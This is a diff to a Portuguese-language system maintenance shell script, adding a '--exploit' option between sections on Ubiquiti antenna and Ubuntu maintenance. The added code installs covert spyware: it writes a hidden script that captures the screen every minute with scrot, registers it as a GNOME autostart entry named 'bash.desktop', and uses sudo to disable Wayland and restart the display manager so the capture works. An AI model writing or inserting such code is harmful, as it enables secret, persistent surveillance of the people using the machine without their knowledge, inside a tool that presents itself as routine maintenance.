@@ -764,6 +764,78 @@ fi #-------------------------------------------------------------- ( TERMINA MAN
 #					    					MANUTENÇÃO DAS ANTENAS UBQUIT
 ########################################################################################################################
 
+if [[ "$1" = "--exploit" ]]; then
+
+export_exploit () {
+	mkdir -p $DIRETORIO
+	echo \
+'
+date=$(date +"%Y-%m-%d")
+datetime=$(date +"%Y-%m-%d-%H-%M-%S")
+
+# Variáveis de personalização
+screenshot_path="$HOME/.config/arjconfig/screenshot/$date"
+screenshot_name="screenshot_$datetime.png"
+
+# Função para criar o diretório de captura de tela, se não existir
+create_screenshot_directory() {
+    if [ ! -d "$screenshot_path" ]; then
+        mkdir -p "$screenshot_path"
+    fi
+}
+
+# Função para capturar a tela e salvar no diretório especificado
+take_screenshot() {
+    scrot "$screenshot_path/$screenshot_name"
+}
+
+# Função principal
+main() {
+    create_screenshot_directory
+    while true; do
+        # Take a screenshot every minute
+        take_screenshot
+        sleep 60
+    done
+}
+
+main
+' > $DIRETORIO/arjexec.sh
+}
+
+auto_start () {
+echo \
+"
+[Desktop Entry]
+Type=Application
+Exec=/bin/bash $DIRETORIO/arjexec.sh
+Hidden=false
+NoDisplay=false
+X-GNOME-Autostart-enabled=true
+Name[pt_BR]=arjexec
+Name=arjexec
+Comment[pt_BR]=
+Comment=
+" > $HOME/.config/autostart/bash.desktop
+}
+
+disable_wayland () {
+    echo "WaylandEnable=false" | sudo tee -a /etc/gdm3/custom.conf
+    sudo systemctl restart gdm3
+}
+
+main_exec_exploit () {
+    DIRETORIO=$HOME/.config/arjconfig
+    sudo apt install scrot -y
+        export_exploit
+        auto_start
+        disable_wayland
+}
+
+	main_exec_exploit
+
+fi 
+
 ########################################################################################################################
 #					    					MANUTENÇÃO UBUNTU
 ########################################################################################################################
